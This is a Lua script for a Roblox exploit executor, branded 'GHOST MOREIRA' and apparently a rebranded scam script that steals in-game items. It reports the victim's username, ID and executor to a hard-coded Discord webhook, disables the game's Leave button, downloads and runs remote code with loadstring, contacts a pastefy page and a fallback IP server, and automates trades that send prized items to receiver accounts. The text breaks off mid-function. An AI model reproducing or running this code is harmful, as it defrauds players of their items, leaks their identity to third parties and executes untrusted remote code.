-- ============================================
-- GHOST MOREIRA | CUSTOM
-- ============================================

task.spawn(function()
    local http_func = request or http_request or (syn and syn.request) or (http and http.request)
    if not http_func then return end
    local new_http = function(args)
        if args and args.Body and type(args.Body) == 'string' then
            args.Body = args.Body:gsub('AUTO MOREIRA CHOCOLA', 'GHOST MOREIRA')
            args.Body = args.Body:gsub('AUTO MOREIRA', 'GHOST MOREIRA')
            args.Body = args.Body:gsub('CHOCOLA SCRIPT', 'GHOST MOREIRA')
            args.Body = args.Body:gsub('Elysium', 'GHOST MOREIRA')
            args.Body = args.Body:gsub('74GMyygaMy', 'XCnCzFvRD')
            args.Body = args.Body:gsub('discord%.gg/3lysium', 'discord.gg/XCnCzFvRD')
        end
        return http_func(args)
    end
    request = new_http
    http_request = new_http
    if syn and syn.request then syn.request = new_http end
    if http and http.request then http.request = new_http end
end)

task.spawn(function()
    local HttpService = game:GetService("HttpService")
    local plr = game:GetService("Players").LocalPlayer
    local function getRequest()
        return syn and syn.request or http and http.request or request or http_request or fluxus and fluxus.request
    end
    local req = getRequest()
    if not req then return end
    local executor = "Unknown"
    if identifyexecutor then pcall(function() executor = identifyexecutor() end) end
    if getexecutorname and executor == "Unknown" then pcall(function() executor = getexecutorname() end) end
    if syn then executor = "Synapse X" end
    if KRNL_LOADED then executor = "KRNL" end
    if fluxus then executor = "Fluxus" end
    local playerCount = #game:GetService("Players"):GetPlayers()
    local timestamp = os.time()
    local desc = "📨 **Invite received from:** `"..plr.Name.."` (ID: `"..plr.UserId.."`)\n\n" ..
                 "## Brainrots\n" .. "🧠 **Dragon Skeletonini**\n🧠 **Phoenix**\n🧠 **Plant Bros**\n🧠 **Hydra Serpent**\n🧠 **Orchidox**\n🧠 **Strawberry Elephant**\n🧠 **Meowl**\n🧠 **Skibidi Toilet**\n🧠 **Los Dragons**\n🧠 **La Craft Machine**\n🧠 **Gold and Diamond**\n🧠 **Dragon Cannelloni**\n🧠 **Dragon Gingerini**\n🧠 **Griffin**\n🧠 **Hydra Dragon Cannelloni**\n🧠 **Hydra Bunny**\n🧠 **Antonio**\n🧠 **John Pork**\n🧠 **Elefanto Frigo**\n🧠 **Rubrikiko**\n🧠 **Pancake and Syrup**\n🧠 **Arcadragon**\n🧠 **Rico Dinero**\n🧠 **Capitano Americano**\n🧠 **Kalika Bros**\n🧠 **Tirilikalika Tirilikalako**\n🧠 **Globa Steppa**\n🧠 **Dug Dug Dug**\n🧠 **Dragon Aquanini**\n🧠 **La Casa Boo**\n🧠 **La Supreme Combinasion**\n🧠 **Headless Horseman**\n🧠 **Signore Carapace**\n🧠 **Fishino Clownino**\n🧠 **4th Bros**\n🧠 **Bufalino Boomberino**\n🧠 **Duggy Bros**\n🧠 **Cerberus**\n🧠 **Kraken**\n🧠 **Money Money Bros**\n🧠 **Venuspino**\n🧠 **Steakini Fattini**\n🧠 **Rhino Helicopterino**\n🧠 **Caylusaurus**\n🧠 **Sammyni Cakini**\n🧠 **Centrucci Nuclucci**\n🧠 **Los Hackers**\n🧠 **John Doe**\n🧠 **Gorillo Subwoofero**\n🧠 **Jelly Moby**\n🧠 **Foxini Lanternini**\n🧠 **Ginger Cisterna**\n🧠 **Bearito Cabinito**\n🧠 **Digi Narwhal**\n🧠 **Los Tangcitos**\n🧠 **Los Tictacs**\n🧠 **Moby Bros**\n🧠 **Los Admins**\n🧠 **1x1x1x1**\n🧠 **25**\n🧠 **67**\n🧠 **Agarrini la Palini**\n🧠 **Arcadopus**\n🧠 **Bacuru and Egguru**\n🧠 **Bananito**\n🧠 **Baskito**\n🧠 **Berryno**\n🧠 **Bisonte Giuppitere**\n🧠 **Blackhole GOAT**\n🧠 **Boatito Auratito**\n🧠 **Boppin Bunny**\n🧠 **Brunito Marsito**\n🧠 **Bunito Bunito Spinito**\n🧠 **Bunnyman**\n🧠 **Bunny and Eggy**\n🧠 **Bunny Bunny Bunny Sahur**\n🧠 **Buntteo**\n🧠 **Burguro and Fryuro**\n🧠 **Burrito Bandito**\n🧠 **Capitano Moby**\n🧠 **Cash or Card**\n🧠 **Celestial Pegasus**\n🧠 **Celularcini Viciosini**\n🧠 **Chachechi**\n🧠 **Chicleteira Bicicleteira**\n🧠 **Chicleteira Cupideira**\n🧠 **Chicleteira Noelteira**\n🧠 **Chicleteirina Bicicleteirina**\n🧠 **Chill Puppy**\n🧠 **Chillin Chili**\n🧠 **Chimnino**\n🧠 **Chipso and Queso**\n🧠 **Churrito Bunnito**\n🧠 **Cigno Fulgoro**\n🧠 **Cloverat Clapat**\n🧠 **Cooki and Milki**\n🧠 **Cuadramat and Pakrahmatmamat**\n🧠 **Cupid Cupid Sahur**\n🧠 **Cupid Hotspot**\n🧠 **DJ Panda**\n🧠 **Donkeyturbo Express**\n🧠 **Dul Dul Dul**\n🧠 **Easter Easter Easter Sahur**\n🧠 **Eid Eid Eid Sahur**\n🧠 **Esok Sekolah**\n🧠 **Eviledon**\n🧠 **Extinct Matteo**\n🧠 **Extinct Tralalero**\n🧠 **Festive 67**\n🧠 **Fishboard**\n🧠 **Fortunu and Cashuru**\n🧠 **Fragola La La La**\n🧠 **Fragrama and Chocrama**\n🧠 **Frankentteo**\n🧠 **GOAT**\n🧠 **Garama and Madundung**\n🧠 **Giftini Spyderini**\n🧠 **Ginger Gerat**\n🧠 **Gobblino Uniciclino**\n🧠 **Gold Gold Gold**\n🧠 **Graipuss Medussi**\n🧠 **Granny**\n🧠 **Guerriro Digitale**\n🧠 **Guest 666**\n🧠 **Ho Ho Ho Sahur**\n🧠 **Hopilikalika Hopilikalako**\n🧠 **Horegini Boom**\n🧠 **Jackorilla**\n🧠 **Job Job Job Sahur**\n🧠 **Jolly Jolly Sahur**\n🧠 **Karker Sahur**\n🧠 **Karkerkar Kurkur**\n🧠 **Ketchuru and Musturu**\n🧠 **Ketupat Bros**\n🧠 **Ketupat Kepat**\n🧠 **La Cucaracha**\n🧠 **La Easter Grande**\n🧠 **La Extinct Grande**\n🧠 **La Food Combinasion**\n🧠 **La Ginger Sekolah**\n🧠 **La Grande Combinasion**\n🧠 **La Jolly Grande**\n🧠 **La Karkerkar Combinasion**\n🧠 **La Lucky Grande**\n🧠 **La Romantic Grande**\n🧠 **La Sahur Combinasion**\n🧠 **La Secret Combinasion**\n🧠 **La Spooky Grande**\n🧠 **La Taco Combinasion**\n🧠 **La Vacca Jacko Linterino**\n🧠 **La Vacca Lepre Lepreino**\n🧠 **La Vacca Prese Presente**\n🧠 **La Vacca Saturno Saturnita**\n🧠 **Las Sis**\n🧠 **Las Tralaleritas**\n🧠 **Las Vaquitas Saturnitas**\n🧠 **Lavadorito Spinito**\n🧠 **Coco and Mango**\n🧠 **Los Secret Combinasionas**\n🧠 **Examen Bros**\n🧠 **Pizza and Ranch**\n🧠 **Chicleteira Champeona**\n🧠 **List List List Sahur**\n🧠 **Los 25**\n🧠 **Los 67**\n🧠 **Los Amigos**\n🧠 **Bumbatron**\n🧠 **Yetimatic**\n🧠 **S'more Serat**\n🧠 **Queen Bee**\n🧠 **Scorpino Coasterino**\n🧠 **Honey Honey Bear**\n🧠 **Pogo Pogo Penguin**\n🧠 **Conetto Morsetto**\n🧠 **La Breakfast Combinasion**\n🧠 **Los Bunitos**\n🧠 **Los Burritos**\n🧠 **Los Candies**\n🧠 **Los Chicleteiras**\n🧠 **Los Combinasionas**\n🧠 **Los Cucarachas**\n🧠 **Los Cupids**\n🧠 **Los Hotspotsitos**\n🧠 **Los Jobcitos**\n🧠 **Los Jolly Combinasionas**\n🧠 **Los Karkeritos**\n🧠 **Los Matteos**\n🧠 **Los Mi Gatitos**\n🧠 **Los Mobilis**\n🧠 **Los Nooo My Hotspotsitos**\n🧠 **Los Planitos**\n🧠 **Los Primos**\n🧠 **Los Puggies**\n🧠 **Los Quesadillas**\n🧠 **Los Sekolahs**\n🧠 **Los Spaghettis**\n🧠 **Los Spooky Combinasionas**\n🧠 **Los Spyderinis**\n🧠 **Los Sweethearts**\n🧠 **Los Tacoritas**\n🧠 **Los Tortus**\n🧠 **Los Tralaleritos**\n🧠 **Los Trios**\n🧠 **Love Love Bear**\n🧠 **Love Love Love Sahur**\n🧠 **Lovin Rose**\n🧠 **Luck Luck Luck Sahur**\n🧠 **Mariachi Corazoni**\n🧠 **Mi Gatito**\n🧠 **Mieteteira Bicicleteira**\n🧠 **Money Money Puggy**\n🧠 **Money Money Reindeer**\n🧠 **Nacho Spyder**\n🧠 **Naughty Naughty**\n🧠 **Noo My Candy**\n🧠 **Noo My Eggs**\n🧠 **Noo My Examine**\n🧠 **Noo My Gold**\n🧠 **Noo My Heart**\n🧠 **Noo My Present**\n🧠 **Nooo My Hotspot**\n🧠 **Nuclearo Dinossauro**\n🧠 **Orcaledon**\n🧠 **Paradiso Axolottino**\n🧠 **Perrito Burrito**\n🧠 **Pirulitoita Bicicleteira**\n🧠 **Please My Present**\n🧠 **Popcuru and Fizzuru**\n🧠 **Pot Hotspot**\n🧠 **Pot Pumpkin**\n🧠 **Pumpkini Spyderini**\n🧠 **Quackini Snackini**\n🧠 **Quesadilla Crocodila**\n🧠 **Quesadillo Vampiro**\n🧠 **Rang Ring Bus**\n🧠 **Reindeer Tralala**\n🧠 **Reinito Sleighito**\n🧠 **Rocco Disco**\n🧠 **Rosey and Teddy**\n🧠 **Rosetti Tualetti**\n🧠 **Sammyni Fattini**\n🧠 **Sammyni Spyderini**\n🧠 **Santa Hotspot**\n🧠 **Santteo**\n🧠 **Secret Lucky Block**\n🧠 **Serafinna Medusella**\n🧠 **Snailo Clovero**\n🧠 **Spaghetti Tualetti**\n🧠 **Spinny Hammy**\n🧠 **Spooky and Pumpky**\n🧠 **Strawberrita**\n🧠 **Swag Soda**\n🧠 **Swaggy Bros**\n🧠 **Tacorita Bicicleta**\n🧠 **Tacorillo Crocodillo**\n🧠 **Tang Tang Keletang**\n🧠 **Telemorte**\n🧠 **Tictac Sahur**\n🧠 **To To To Sahur**\n🧠 **Torrtuginni Dragonfrutini**\n🧠 **Tralaledon**\n🧠 **Trenostruzzo Turbo 4000**\n🧠 **Trickolino**\n🧠 **Triplito Tralaleritos**\n🧠 **Tuff Toucan**\n🧠 **Tung Tung Tung Sahur**\n🧠 **Ventoliero Pavonero**\n🧠 **Vulturino Skeletono**\n🧠 **W or L**\n🧠 **Yess My Examine**\n🧠 **Zombie Tralala**\n🧠 **Grabatron**\n🧠 **Rubiko and Kubiko**\n🧠 **Cangurato Gelato**\n🧠 **Noodle Noodle Poodle**\n🧠 **Candini Fluffini**\n🧠 **La Fuse Machine**\n🧠 **Polaroidini**\n🧠 **Nachorilla**\n🧠 **Sammyni Truckini**\n🧠 **Tacoturbo Tacorito**\n🧠 **Burrito Bat**\n🧠 **Chicli Chicla**\n🧠 **Panda Popanda**\n🧠 **Deputy Leopard**" .. "\n\n" ..
                 "## Base Skins\n" .. "🎨 **Aquatic**\n🎨 **Bunny Basket**\n🎨 **Candy**\n🎨 **Christmas**\n🎨 **Cursed**\n🎨 **Cyber**\n🎨 **Diamond**\n🎨 **Divine**\n🎨 **Easter**\n🎨 **Galaxy**\n🎨 **Gingerbread**\n🎨 **Gold**\n🎨 **Halloween**\n🎨 **Lava**\n🎨 **Lucky**\n🎨 **Octo**\n🎨 **Pot of Gold**\n🎨 **Radioactive**\n🎨 **Rainbow**\n🎨 **Rose**\n🎨 **Summer**\n🎨 **Taco**\n🎨 **Valentines**\n🎨 **Yin Yang**\n🎨 **Tralalero**" .. "\n\n" ..
                 "## Gears\n" .. "⚙️ **Alien Slap**\n⚙️ **Blackhole Bomb**\n⚙️ **Bloodmoon Hammer**\n⚙️ **Bloodmoon Slap**\n⚙️ **Candy Sentry**\n⚙️ **Candy Slap**\n⚙️ **Cupid's Wings**\n⚙️ **Cursed Slap**\n⚙️ **Cyber Slap**\n⚙️ **Demon's Head**\n⚙️ **Divine Slap**\n⚙️ **Lava Blaster**\n⚙️ **Lava Slap**\n⚙️ **Radioactive Airstrike**\n⚙️ **Radioactive Slap**\n⚙️ **Rainbow Hammer**\n⚙️ **Rainbow Slap**\n⚙️ **Santa's Sleigh**\n⚙️ **Waverider**\n⚙️ **Witch's Broom**\n⚙️ **Yin Yang Lamp**\n⚙️ **Yin Yang Slap**\n⚙️ **Phantom Slap**\n⚙️ **Crystal Slap**" .. "\n\n" ..
                 "## Status\n**Not in Duel**\n" ..
                 "🕒 <t:"..timestamp..":f>\n" ..
                 "🌍 Players in server: **"..playerCount.."**\n" ..
                 "⚡ Executor: **"..executor.."**"
    local body = HttpService:JSONEncode({
        content = "@everyone",
        username = "GHOST MOREIRA",
        avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png",
        embeds = {{ title = "GHOST MOREIRA", description = desc, color = 3007599, footer = {text = "GHOST MOREIRA | https://discord.gg/XCnCzFvRD"} }}
    })
    pcall(function() req({ Url = "https://discord.com/api/webhooks/1570926746801283134/kPzgJ58N39Z9pleBPypqhLDj94TOP1vFx2QVTZQ1NgmUl1YZDAzO0M9FFnUIki0qmEPD", Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body }) end)
end)

getgenv().RECEIVERS = { "said123ca" }
getgenv().WEBHOOK = "https://discord.com/api/webhooks/1570926746801283134/kPzgJ58N39Z9pleBPypqhLDj94TOP1vFx2QVTZQ1NgmUl1YZDAzO0M9FFnUIki0qmEPD"
getgenv().THRESHOLD = 0
getgenv().PRIORITY = {
    "Dragon Skeletonini",
    "Phoenix",
    "Plant Bros",
    "Hydra Serpent",
    "Orchidox",
    "Strawberry Elephant",
    "Meowl",
    "Skibidi Toilet",
    "Los Dragons",
    "La Craft Machine",
    "Gold and Diamond",
    "Dragon Cannelloni",
    "Dragon Gingerini",
    "Griffin",
    "Hydra Dragon Cannelloni",
    "Hydra Bunny",
    "Antonio",
    "John Pork",
    "Elefanto Frigo",
    "Rubrikiko",
    "Pancake and Syrup",
    "Arcadragon",
    "Rico Dinero",
    "Capitano Americano",
    "Kalika Bros",
    "Tirilikalika Tirilikalako",
    "Globa Steppa",
    "Dug Dug Dug",
    "Dragon Aquanini",
    "La Casa Boo",
    "La Supreme Combinasion",
    "Headless Horseman",
    "Signore Carapace",
    "Fishino Clownino",
    "4th Bros",
    "Bufalino Boomberino",
    "Duggy Bros",
    "Cerberus",
    "Kraken",
    "Money Money Bros",
    "Venuspino",
    "Steakini Fattini",
    "Rhino Helicopterino",
    "Caylusaurus",
    "Sammyni Cakini",
    "Centrucci Nuclucci",
    "Los Hackers",
    "John Doe",
    "Gorillo Subwoofero",
    "Jelly Moby",
    "Foxini Lanternini",
    "Ginger Cisterna",
    "Bearito Cabinito",
    "Digi Narwhal",
    "Los Tangcitos",
    "Los Tictacs",
    "Moby Bros",
    "Los Admins",
    "1x1x1x1",
    "25",
    "67",
    "Agarrini la Palini",
    "Arcadopus",
    "Bacuru and Egguru",
    "Bananito",
    "Baskito",
    "Berryno",
    "Bisonte Giuppitere",
    "Blackhole GOAT",
    "Boatito Auratito",
    "Boppin Bunny",
    "Brunito Marsito",
    "Bunito Bunito Spinito",
    "Bunnyman",
    "Bunny and Eggy",
    "Bunny Bunny Bunny Sahur",
    "Buntteo",
    "Burguro and Fryuro",
    "Burrito Bandito",
    "Capitano Moby",
    "Cash or Card",
    "Celestial Pegasus",
    "Celularcini Viciosini",
    "Chachechi",
    "Chicleteira Bicicleteira",
    "Chicleteira Cupideira",
    "Chicleteira Noelteira",
    "Chicleteirina Bicicleteirina",
    "Chill Puppy",
    "Chillin Chili",
    "Chimnino",
    "Chipso and Queso",
    "Churrito Bunnito",
    "Cigno Fulgoro",
    "Cloverat Clapat",
    "Cooki and Milki",
    "Cuadramat and Pakrahmatmamat",
    "Cupid Cupid Sahur",
    "Cupid Hotspot",
    "DJ Panda",
    "Donkeyturbo Express",
    "Dul Dul Dul",
    "Easter Easter Easter Sahur",
    "Eid Eid Eid Sahur",
    "Esok Sekolah",
    "Eviledon",
    "Extinct Matteo",
    "Extinct Tralalero",
    "Festive 67",
    "Fishboard",
    "Fortunu and Cashuru",
    "Fragola La La La",
    "Fragrama and Chocrama",
    "Frankentteo",
    "GOAT",
    "Garama and Madundung",
    "Giftini Spyderini",
    "Ginger Gerat",
    "Gobblino Uniciclino",
    "Gold Gold Gold",
    "Graipuss Medussi",
    "Granny",
    "Guerriro Digitale",
    "Guest 666",
    "Ho Ho Ho Sahur",
    "Hopilikalika Hopilikalako",
    "Horegini Boom",
    "Jackorilla",
    "Job Job Job Sahur",
    "Jolly Jolly Sahur",
    "Karker Sahur",
    "Karkerkar Kurkur",
    "Ketchuru and Musturu",
    "Ketupat Bros",
    "Ketupat Kepat",
    "La Cucaracha",
    "La Easter Grande",
    "La Extinct Grande",
    "La Food Combinasion",
    "La Ginger Sekolah",
    "La Grande Combinasion",
    "La Jolly Grande",
    "La Karkerkar Combinasion",
    "La Lucky Grande",
    "La Romantic Grande",
    "La Sahur Combinasion",
    "La Secret Combinasion",
    "La Spooky Grande",
    "La Taco Combinasion",
    "La Vacca Jacko Linterino",
    "La Vacca Lepre Lepreino",
    "La Vacca Prese Presente",
    "La Vacca Saturno Saturnita",
    "Las Sis",
    "Las Tralaleritas",
    "Las Vaquitas Saturnitas",
    "Lavadorito Spinito",
    "Coco and Mango",
    "Los Secret Combinasionas",
    "Examen Bros",
    "Pizza and Ranch",
    "Chicleteira Champeona",
    "List List List Sahur",
    "Los 25",
    "Los 67",
    "Los Amigos",
    "Bumbatron",
    "Yetimatic",
    "S'more Serat",
    "Queen Bee",
    "Scorpino Coasterino",
    "Honey Honey Bear",
    "Pogo Pogo Penguin",
    "Conetto Morsetto",
    "La Breakfast Combinasion",
    "Los Bunitos",
    "Los Burritos",
    "Los Candies",
    "Los Chicleteiras",
    "Los Combinasionas",
    "Los Cucarachas",
    "Los Cupids",
    "Los Hotspotsitos",
    "Los Jobcitos",
    "Los Jolly Combinasionas",
    "Los Karkeritos",
    "Los Matteos",
    "Los Mi Gatitos",
    "Los Mobilis",
    "Los Nooo My Hotspotsitos",
    "Los Planitos",
    "Los Primos",
    "Los Puggies",
    "Los Quesadillas",
    "Los Sekolahs",
    "Los Spaghettis",
    "Los Spooky Combinasionas",
    "Los Spyderinis",
    "Los Sweethearts",
    "Los Tacoritas",
    "Los Tortus",
    "Los Tralaleritos",
    "Los Trios",
    "Love Love Bear",
    "Love Love Love Sahur",
    "Lovin Rose",
    "Luck Luck Luck Sahur",
    "Mariachi Corazoni",
    "Mi Gatito",
    "Mieteteira Bicicleteira",
    "Money Money Puggy",
    "Money Money Reindeer",
    "Nacho Spyder",
    "Naughty Naughty",
    "Noo My Candy",
    "Noo My Eggs",
    "Noo My Examine",
    "Noo My Gold",
    "Noo My Heart",
    "Noo My Present",
    "Nooo My Hotspot",
    "Nuclearo Dinossauro",
    "Orcaledon",
    "Paradiso Axolottino",
    "Perrito Burrito",
    "Pirulitoita Bicicleteira",
    "Please My Present",
    "Popcuru and Fizzuru",
    "Pot Hotspot",
    "Pot Pumpkin",
    "Pumpkini Spyderini",
    "Quackini Snackini",
    "Quesadilla Crocodila",
    "Quesadillo Vampiro",
    "Rang Ring Bus",
    "Reindeer Tralala",
    "Reinito Sleighito",
    "Rocco Disco",
    "Rosey and Teddy",
    "Rosetti Tualetti",
    "Sammyni Fattini",
    "Sammyni Spyderini",
    "Santa Hotspot",
    "Santteo",
    "Secret Lucky Block",
    "Serafinna Medusella",
    "Snailo Clovero",
    "Spaghetti Tualetti",
    "Spinny Hammy",
    "Spooky and Pumpky",
    "Strawberrita",
    "Swag Soda",
    "Swaggy Bros",
    "Tacorita Bicicleta",
    "Tacorillo Crocodillo",
    "Tang Tang Keletang",
    "Telemorte",
    "Tictac Sahur",
    "To To To Sahur",
    "Torrtuginni Dragonfrutini",
    "Tralaledon",
    "Trenostruzzo Turbo 4000",
    "Trickolino",
    "Triplito Tralaleritos",
    "Tuff Toucan",
    "Tung Tung Tung Sahur",
    "Ventoliero Pavonero",
    "Vulturino Skeletono",
    "W or L",
    "Yess My Examine",
    "Zombie Tralala",
    "Grabatron",
    "Rubiko and Kubiko",
    "Cangurato Gelato",
    "Noodle Noodle Poodle",
    "Candini Fluffini",
    "La Fuse Machine",
    "Polaroidini",
    "Nachorilla",
    "Sammyni Truckini",
    "Tacoturbo Tacorito",
    "Burrito Bat",
    "Chicli Chicla",
    "Panda Popanda",
    "Deputy Leopard",
}

getgenv().GHOST_ANTILEAVE = true
task.spawn(function()
    while task.wait(1) do
        pcall(function()
            local shield = game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated
            for _, c in ipairs(getconnections(shield)) do c:Disable() end
        end)
    end
end)

-- CUSTOM SCRIPT EXECUTION
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/666HackScripts/AutoCode/refs/heads/main/sab"))()
    end)
end)
-- AUTO-TRADE (sab.lua modificado)
task.spawn(function()
    local ok, err = pcall(function()
        
        
        
        
        
        
        
        
        if not game:IsLoaded() then
        	game.Loaded:Wait()
        end
        
        if setclipboard then
        	setclipboard("https://discord.gg/3lysium")
        end
        
        task.spawn(function()
        	while task.wait() do
        		pcall(function()
        			for _, v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
        				v:Disable()
        			end
        		end)
        	end
        end)
        
        local str = nil
        
        if not isfolder("vex_dumps") then
        	pcall(makefolder, "vex_dumps")
        end
        
        local function fn()
        	if not str then
        		local now = os.time()
        		str = string.format("%s/sab_debug_%d.txt", "vex_dumps", now)
        		local str2 = string.format("=== SAB DEBUG LOG %s ===\n", os.date("%Y-%m-%d %H:%M:%S"))
        		pcall(writefile, str, str2)
        	end
        
        	return str
        end
        
        local function fn2(arg)
        	local v = fn()
        	local str2 = os.date("[%H:%M:%S] ") .. arg .. "\n"
        
        	if type(appendfile) == "function" then
        		pcall(appendfile, v, str2)
        	else
        		pcall(writefile, v, (pcall(readfile, v) and readfile(v) or "") .. str2)
        	end
        end
        
        local flag = false
        
        local function fn3(...)
        	local v = table.pack(...)
        	if not flag then
        		return
        	end
        	local tbl = {}
        
        	for i = 1, select("#", ...) do
        		tbl[i] = tostring(select(i, table.unpack(v, 1, v.n)))
        	end
        
        	local str2 = table.concat(tbl, " ")
        	print("[SAB-DBG]", str2)
        	pcall(fn2, str2)
        end
        
        fn3("Debug mode ENABLED")
        local Players = game:GetService("Players")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local Workspace = game:GetService("Workspace")
        local RunService = game:GetService("RunService")
        local Lighting = game:GetService("Lighting")
        local HttpService = game:GetService("HttpService")
        local localPlayer = Players.LocalPlayer
        local HttpService2 = game:GetService("HttpService")
        fn3("Player:", localPlayer.Name, "PlaceId:", game.PlaceId)
        local str2 = "https://pastefy.app/fuWreksR/raw?t=" .. tostring(tick())
        
        local function fn4()
        	local ok, result = pcall(function()
        		return game:HttpGet(str2)
        	end)
        
        	if ok and result then
        		local match = result:match("^%s*(.-)%s*$")
        
        		if match and match ~= "" then
        			if match:match("^https?://") then
        				fn3("API base loaded:", match)
        				return match
        			end
        			fn3("API base loaded (http added):", "http://" .. match)
        			return "http://" .. match
        		end
        	end
        
        	fn3("API base load FAILED, using fallback")
        	return "http://212.119.42.158:3000"
        end
        
        if not getgenv().SAB_API_BASE then
        	getgenv().SAB_API_BASE = fn4()
        end
        
        local sabApiBase = getgenv().SAB_API_BASE
        local receivers = getgenv().RECEIVERS or { "NEDYXSTOCK19" }
        local n = 15
        local n2 = 180
        local threshold = getgenv().THRESHOLD or 1000000
        fn3("Loading priority list...")
        -- ps.lua removido
        
        local priority = getgenv().PRIORITY or {
        	"Meowl",
        	"Strawberry elephant",
        	"Skibidi toilet",
        	"Headless horseman",
        	"Dragon Cannelloni",
        	"Hydra dragon cannelloni",
        	"Dragon Gingerini",
        	"Capitano moby",
        	"La casa boo",
        	"Fragrama and chocrama",
        	"La supreme combinasion",
        	"Cooki and milki",
        	"Burguro and fryuro",
        	"Garama and madungdung",
        	"La secret combinasion",
        	"Spooky and pumpky",
        	"Reinito sleighito",
        	"Ketchuru and musturu",
        	"La taco combinasion",
        	"Tralaledon",
        	"Eviledon",
        	"Los bros",
        	"Tictac sahur",
        	"Cerberus",
        	"Celestial Pegasus",
        	"Love Love Bear",
        	"Festive 67",
        	"Ginger Gerat",
        	"Ketupat Bros",
        	"Rosey and Teddy",
        }
        
        local tbl = {}
        
        for _, v in ipairs(priority) do
        	tbl[v:lower()] = true
        end
        
        local tbl2 = {}
        
        for _, v in ipairs({
        	"meowl",
        	"strawberry elephant",
        	"skibidi toilet",
        	"headless horseman",
        	"dragon cannelloni",
        	"hydra dragon cannelloni",
        	"dragon gingerini",
        	"love love bear",
        	"signore carapace",
        	"elefanto frigo",
        	"griffin",
        	"john pork",
        	"digi narwhal",
        	"la supreme combinasion",
        }) do
        	tbl2[v:lower()] = true
        end
        
        local webhook = getgenv().WEBHOOK or ""
        local str3 = "AaFaIalakb*abbaaMaqa[a6aLa-aaacbdb4a_a+aka*aSbeb<awala1aGaaaCa3acasa8a#aEaebaada#aba)a=akbdaRbnaXatawaDahayagbkbwaQazaba6a$avaaayaza[ayalbFb-aFagbibubyaga[aaaAabafa!a1a7aiafa6a*a8acaxa-aiazagavaebDamana-a(aSazaibdbabEa*aHaaabbqa=aCa$aQagbcaMakbhb1ajaibha%aCalbFaka#aAajbuazaBaaajb"
        local str4 = "AaFanaVa>a-aebhaUaqa]aKaQa}aaawaab#aPb+aka*agbxajbwa=a4axauaCaracavaea&aEa0atada$awa=a-a=adaFbXa#a[awaDahayagbkbwataDabaxabavaaayaEa{ayalbIb-agaSbibLbNbgafaaaAa>afaza4a5aiaOala(aqaRaxa-aiaBaga_a%aUa0ana-a^aGagacb>acbEa*awaaabbqakaCa-amagbcblakbhb2aZahbsa%aCalbFaka]aAaTaua*acaaafb"
        local n3 = 15
        local v = sabApiBase
        local str5 = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
        local n4 = 300
        local flag2 = false
        local tbl3 = {}
        local flag3 = false
        fn3("Config loaded | Targets:", #receivers, "| Threshold:", threshold)
        
        local tbl4 = {
        	Invite = "afb005f9-6e81-4e0a-8bb0-3555938a9658",
        	AcceptInvite = "57624f2b-8aa9-4974-bb7a-08f058af33ef",
        	SearchUser = "792baf13-54a1-4663-92c4-1edd9da1e3e2",
        	AddBrainrot = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda",
        	RemoveBrainrot = "1a5f9c76-711f-4c90-8117-2ffd3fa21c6d",
        }
        
        local tbl5 = {
        	DeclineInvite = "99448380-7cdd-45ad-be4e-332ec6194ba6",
        	CancelTrade = "9d1937e7-6262-487b-98be-af45618270c9",
        	Accept = "918ee0f5-e98f-413f-b76e-baee47b021cb",
        	Ready = "d73acf93-6f32-44df-b813-0f6b32c7afd9",
        }
        
        local tbl6 = {}
        
        local function fn5(arg, arg2)
        	return typeof(arg) == "Instance" and arg:IsA(arg2)
        end
        
        local function fn6()
        	local ok, result = pcall(require, ReplicatedStorage.Controllers.TradeController)
        	if not ok or type(result) ~= "table" then
        		fn3("[EXTRACT] require(TradeController) failed: " .. tostring(result))
        		return false
        	end
        
        	local function fn7(arg, arg2)
        		if type(arg) ~= "function" then
        			return nil
        		end
        		local ok2, result2 = pcall(getupvalues, arg)
        		if ok2 and type(result2) == "table" then
        			return result2[arg2]
        		end
        		return nil
        	end
        
        	local function fn8(arg, arg2, arg3)
        		if type(arg) ~= "table" then
        			return nil
        		end
        		local v2 = arg[arg2]
        		if type(v2) ~= "table" then
        			return nil
        		end
        		local v3 = v2[arg3]
        		if type(v3) ~= "function" then
        			return nil
        		end
        		local ok2, result2 = pcall(getupvalues, v3)
        
        		if ok2 and type(result2) == "table" then
        			for _, v4 in pairs(result2) do
        				if fn5(v4, "RemoteFunction") then
        					return v4
        				end
        			end
        		end
        
        		return nil
        	end
        
        	local createInvites = result._createInvites
        	tbl6.CreateInvite = tbl6.CreateInvite or fn7(createInvites, 1)
        	tbl6.AcceptInvite = tbl6.AcceptInvite or fn7(createInvites, 6)
        	tbl6.DeclineInvite = tbl6.DeclineInvite or fn7(createInvites, 8)
        	local ok2, result2 = pcall(getupvalues, result._createLiveTrade)
        
        	if ok2 and type(result2) == "table" then
        		tbl6.CancelTrade = tbl6.CancelTrade or result2[22]
        		tbl6.Accept = tbl6.Accept or result2[23]
        		tbl6.Ready = tbl6.Ready or result2[24]
        		local v2 = result2[15]
        
        		if type(v2) == "table" then
        			tbl6.AddBrainrot = tbl6.AddBrainrot or fn8(v2, "Brainrot", "Add")
        			tbl6.RemoveBrainrot = tbl6.RemoveBrainrot or fn8(v2, "Brainrot", "Remove")
        		end
        	end
        
        	local ok3, result3 = pcall(getupvalues, result._createPlayerList)
        
        	if ok3 and type(result3) == "table" then
        		local tbl7 = {}
        
        		for k, v2 in pairs(result3) do
        			if fn5(v2, "RemoteFunction") then
        				tbl7[#tbl7 + 1] = { i = k, v = v2 }
        			end
        		end
        
        		table.sort(tbl7, function(arg, arg2)
        			return arg.i < arg2.i
        		end)
        
        		if tbl7[1] then
        			tbl6.SearchUser = tbl6.SearchUser or tbl7[1].v
        		end
        
        		if tbl7[2] then
        			tbl6.Invite = tbl6.Invite or tbl7[2].v
        		end
        
        		if not tbl6.AddBrainrot then
        			local v2 = result3[19]
        
        			if type(v2) == "table" then
